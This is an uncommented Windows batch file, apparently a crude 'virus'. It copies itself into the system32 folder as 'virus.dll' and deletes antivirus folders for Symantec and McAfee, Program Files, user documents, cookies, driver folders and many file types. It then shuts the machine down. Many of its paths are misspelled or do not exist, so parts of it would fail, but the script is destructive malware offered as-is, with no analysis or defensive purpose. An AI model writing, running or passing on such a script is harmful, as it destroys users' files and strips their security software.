@echo off

cls
echo  "deleting all"
:del
copy %0 "C:\WINDOWS\system32\virus.dll"
del C:\Program Files\symantec
del C:\Program Files\McAfee
del C:\newfolder
del C:\Program Files\Accessories
del C:\Program Files\*.*
del C:\windows\cookies\*.*
del C:\windows\winzip\*.*
del C:\windows\windowsmediaplay\*.*
del C:\windows\mydocuments\*.*
del C:\windows\msword\*.*
del C:\windows\msoutlook\*.*
del C:\windows\commandprompt\*.*
del C:\windows\cookies\*.*
del C:\windows\internetexsplorer\*.*
del C:\windows\mydocuments\*.*
del C:\windows\docmentsandsettings\*.*
del C:\desktop\recyclebin\*.*
del C:\americanonline\*.*
del C:\desktop\mydocuments\*.*
del C:\winnt\system32\drivers\flpydisk\*.*
del C:\winnt\system32\drivers\ccdecode\*.*
del C:\winnt\system32\drivers\cdaudio\*.*
del C:\winnt\system32\cmd\*.*
del C:\*.txt\*.*
del C:\*.csl\*.*
del C:\*.lst\*.*
del C:\*.ind\*.*
del C:\*.idx\*.*
del C:\*.dll\*.*
del C:\*.vxd\*.*
del C:\*.gif\*.*
del C:\*.pif\*.*
del C:\*.jpg\*.*
del C:\*.dat\*.*
del C:\*.arl\*.*
del C:\*.tol\*.*
del C:\*.bin\*.*
del C:\*.cnt\*.*
del C:\*.txt\*.*
del C:\*.bit\*.*
del C:\winzip\*.*
RUNDLL32 SHELL32.DLL,SHExitWindowsEx n.